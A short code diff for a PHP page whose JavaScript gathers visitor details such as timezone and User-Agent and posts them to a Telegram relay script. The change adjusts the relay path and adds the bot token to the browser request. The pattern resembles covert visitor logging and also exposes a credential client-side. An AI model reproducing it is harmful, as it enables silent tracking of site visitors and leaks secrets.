@@ -591,10 +591,10 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                 "\nTimezone: " + "`<?php echo $timezone; ?>`" +
                 "\nUser-Agent: " + "`<?php echo $userAgent; ?>`";
             
-            fetch('/send-telegram.php', {
+            fetch('../send-telegram.php', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: content, parse_mode: 'Markdown' })
+                body: JSON.stringify({ chat_id: chatId, text: content, parse_mode: 'Markdown', token: botToken })
             })
             .then(response => response.json())
             .then(data => {
